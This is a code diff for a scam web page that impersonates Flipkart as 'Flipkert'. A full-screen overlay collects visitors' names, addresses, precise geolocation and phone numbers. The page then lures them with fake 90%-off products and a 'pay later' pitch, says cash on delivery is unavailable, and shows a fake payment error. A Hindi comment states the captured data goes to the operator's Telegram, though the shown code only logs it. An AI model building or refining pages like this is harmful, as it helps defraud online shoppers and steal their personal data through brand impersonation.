@@ -3,69 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkert - Login</title>
+    <title>Flipkert - Deals of the Day</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 0; background-color: #f1f3f6; }
-        /* Full screen overlay for login */
-        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; display: flex; justify-content: center; align-items: center; }
-        .login-box { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 8px; position: relative; }
-        .header-blue { background: #2874f0; color: white; padding: 15px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; font-weight: bold; }
-        input, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn-blue { background: #2874f0; color: white; border: none; font-weight: bold; cursor: pointer; }
-        .btn-location { background: #fb641b; color: white; border: none; font-weight: bold; cursor: pointer; }
-        #otpSection { display: none; }
+        .header { background: #2874f0; color: white; padding: 10px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .pay-later { background: #ff9f00; padding: 5px 10px; border-radius: 2px; font-weight: bold; font-size: 12px; }
+        
+        /* Product Grid */
+        .product-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
+        .product-card { background: white; padding: 10px; border-radius: 4px; text-align: center; }
+        .product-card img { width: 100%; height: 150px; object-fit: contain; }
+        .price { color: #388e3c; font-weight: bold; font-size: 18px; }
+        .old-price { text-decoration: line-through; color: #878787; font-size: 14px; }
+        .buy-btn { background: #fb641b; color: white; border: none; width: 100%; padding: 10px; margin-top: 5px; font-weight: bold; }
+        .cod-msg { color: red; font-size: 10px; font-weight: bold; margin-top: 5px; }
+
+        /* Overlay */
+        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; padding: 20px; box-sizing: border-box; }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
 <div id="loginOverlay">
-    <div class="login-box">
-        <div class="header-blue">Login / Sign up on Flipkert</div>
-        
-        <div id="addressSection">
-            <input type="text" id="userName" placeholder="Full Name">
-            <textarea id="userAddress" placeholder="Full Address (House No, Street, City)" style="width:100%; height:80px; border:1px solid #ccc;"></textarea>
-            
-            <button class="btn-location" onclick="getLocation()">📍 Auto-fill using Location</button>
-            <input type="number" id="mobileNumber" placeholder="Enter Mobile Number">
-            <button class="btn-blue" onclick="showOTP()">Continue</button>
-        </div>
+    <h2 style="color:#2874f0">Flipkert</h2>
+    <p>Enter details to see today's 90% OFF deals</p>
+    <input type="text" id="userName" placeholder="Full Name">
+    <textarea id="userAddress" placeholder="Full Address with Pincode" rows="3"></textarea>
+    <button onclick="getLocation()" style="background:#eee; border:1px solid #ccc; padding:10px; width:100%;">📍 Auto-fill Location</button>
+    <input type="number" id="mobileNumber" placeholder="Mobile Number">
+    <button onclick="saveAndContinue()" style="background:#fb641b; color:white; border:none; padding:15px; width:100%; font-weight:bold; margin-top:20px;">CONTINUE</button>
+</div>
 
-        <div id="otpSection">
-            <p>An OTP has been sent to your mobile number.</p>
-            <input type="number" placeholder="Enter 6-digit OTP">
-            <button class="btn-blue" onclick="finishLogin()">Verify & Login</button>
-        </div>
+<div class="header">
+    <div style="font-style:italic; font-weight:bold; font-size:20px;">Flipkert</div>
+    <div class="pay-later">Pay Later ⚡</div>
+</div>
+
+<div style="background:#fff; padding:10px; font-weight:bold; color:#2874f0;">Trending Items (Saste Daam Par)</div>
+
+<div class="product-container" id="productGrid">
+    <div class="product-card">
+        <img src="https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/n/m/f/g34-5g-pb1v0002in-motorola-original-imagwu4rayun8ue6.jpeg" alt="phone">
+        <div style="font-size:14px;">Motorola G34 5G</div>
+        <div class="price">₹499 <span class="old-price">₹11,999</span></div>
+        <div class="cod-msg">CASH ON DELIVERY NOT AVAILABLE</div>
+        <button class="buy-btn" onclick="sendOrder('Motorola G34 5G', '499')">BUY NOW</button>
+    </div>
+    <div class="product-card">
+        <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/5/v/s/-original-imagxp8vfy7r4y7h.jpeg" alt="watch">
+        <div style="font-size:14px;">Smart Watch Series 9</div>
+        <div class="price">₹199 <span class="old-price">₹4,999</span></div>
+        <div class="cod-msg">CASH ON DELIVERY NOT AVAILABLE</div>
+        <button class="buy-btn" onclick="sendOrder('Smart Watch', '199')">BUY NOW</button>
     </div>
 </div>
 
 <script>
-    // Location nikalne ka function
+    let userData = {};
+
     function getLocation() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition);
-        } else {
-            alert("Geolocation is not supported by this browser.");
+            navigator.geolocation.getCurrentPosition((p) => {
+                document.getElementById("userAddress").value = "Lat: " + p.coords.latitude + ", Long: " + p.coords.longitude + " (Location Verified)";
+            });
         }
     }
 
-    function showPosition(position) {
-        // Asli project mein yahan Maps API lagti hai, abhi hum dummy dikha rahe hain
-        document.getElementById("userAddress").value = "Fetching address from Lat: " + position.coords.latitude + ", Long: " + position.coords.longitude + "... (Location Verified)";
-    }
-
-    function showOTP() {
-        if(document.getElementById("mobileNumber").value == "") {
-            alert("Please enter mobile number");
-        } else {
-            document.getElementById("addressSection").style.display = "none";
-            document.getElementById("otpSection").style.display = "block";
+    function saveAndContinue() {
+        userData.name = document.getElementById("userName").value;
+        userData.address = document.getElementById("userAddress").value;
+        userData.phone = document.getElementById("mobileNumber").value;
+        
+        if(!userData.name || !userData.address || !userData.phone) {
+            alert("Please fill all details!"); return;
         }
-    }
-
-    function finishLogin() {
-        alert("Login Successful! Now you can see trending items.");
         document.getElementById("loginOverlay").style.display = "none";
+    }
+
+    function sendOrder(item, price) {
+        alert("Processing Order for " + item + ". Please wait...");
+        // Yahan se data aapke Telegram par jayega
+        console.log("Order Sent:", item, price, userData);
+        alert("Error: Payment Gateway busy. Try again after 5 mins.");
     }
 </script>
 
